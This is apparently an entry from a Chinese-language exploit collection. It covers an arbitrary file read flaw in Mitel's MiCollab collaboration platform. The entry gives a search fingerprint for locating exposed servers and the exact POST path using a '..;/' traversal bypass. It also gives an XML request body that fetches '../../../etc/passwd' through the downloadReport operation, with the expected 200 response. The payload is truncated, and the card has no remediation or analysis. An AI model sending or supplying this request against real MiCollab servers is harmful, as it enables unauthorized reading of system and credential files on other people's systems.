# Mitel企业协作平台IDACall存在任意文件读取漏洞

- **系统**：Mitel　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="MiCollab End User Portal"`
- **请求**：`POST /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2 HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
_transaction=<transaction xmlns:xsi="http://www.w3.org/2000/10/XMLSchema-instance" xsi:type="xsd:Object"><transactionNum xsi:type="xsd:long">2</transactionNum><operations xsi:type="xsd:List"><elem xsi:type="xsd:Object"><criteria xsi:type="xsd:Object"><reportName>../../../etc/passwd</reportName></criteria><operationConfig xsi:type="xsd:Object"><dataSource>summary_reports</dataSource><operationType>fetch</operationType></operationConfig><appID>builtinApplication</appID><operation>downloadReport</operation><oldValues xsi:type="xsd:Object"><reportName>x.txt</reportName></oldValues></elem></operati…（脚本共 683 字，完整版见原文）
```
- **预期**：200　|　—